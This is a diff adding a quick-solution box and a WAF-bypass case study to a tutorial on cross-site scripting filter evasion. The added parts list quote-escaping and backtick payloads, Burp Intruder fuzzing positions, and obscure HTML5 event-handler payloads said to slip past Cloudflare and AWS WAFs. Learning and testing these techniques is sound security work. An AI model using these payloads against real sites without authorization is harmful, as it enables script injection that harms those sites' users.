@@ -1,5 +1,21 @@
 # Cross-Site Scripting (XSS): Bypassing Single Quotes, Advanced Filters, & Fuzzing with Burp Intruder
 
+> [!TIP]
+> ### ⚡ Quick Solution (Direct Execution)
+> 1. **Bypass Quote Escaping (`'`):** Neutralize the backend backslash with your own backslash:
+>    ```javascript
+>    ';alert(1)//
+>    ```
+> 2. **Bypass Blocked Parentheses `()`:** Use ES6 template literals (backticks):
+>    ```javascript
+>    `onerror=alert`1`
+>    ```
+> 3. **WAF Filter Fuzzing (Burp Intruder):**
+>    - Tag position: `<§tag§ id=x>` $\rightarrow$ load the PortSwigger HTML tags wordlist.
+>    - Event handler: `<svg §event§=1>` $\rightarrow$ filter for `200 OK` to detect allowed event handlers.
+
+---
+
 In real-world penetration testing and bug bounty hunting, you will rarely encounter an application that permits raw, unadulterated `<script>alert(1)</script>` payloads without interference.
 
 Most modern web applications deploy defensive mechanisms:
@@ -325,6 +341,14 @@ function encodeForHtmlAttribute(input: string): string {
 ```
 
 ---
+
+## 🌍 Real-World Case Study & Security Incidents
+
+### Bypassing Cloudflare & AWS WAFs via Obscure HTML5 Event Handlers
+In real-world bug bounty hunting, nearly every high-value target sits behind a Web Application Firewall:
+* **The WAF Blacklist Weakness:** Enterprise firewalls such as Cloudflare WAF, AWS WAF, and Imperva block common tokens like `<script>`, `onerror=`, `onload=`, and `<iframe`.
+* **Fuzzing Rare Tags via Burp Intruder:** Bug hunters spray dictionaries derived from PortSwigger's HTML5 Cheat Sheet. Obscure HTML5 elements—such as `<svg><animatetransform onbegin=alert(1)>`, `<details ontoggle=alert(1) open>`, or `<select autofocus onfocusin=alert(1)>`—often bypass signature-based WAF regex rules while executing reliably in modern Chromium engines.
+* **Bounty Rewards:** Novel WAF bypasses leading to stored or reflected XSS on enterprise targets (e.g., PayPal, Microsoft, GitLab) routinely yield top-tier payouts of **$10,000 to $25,000 USD**.
 
 ## 8. Key Takeaways for Filter Evasion
 
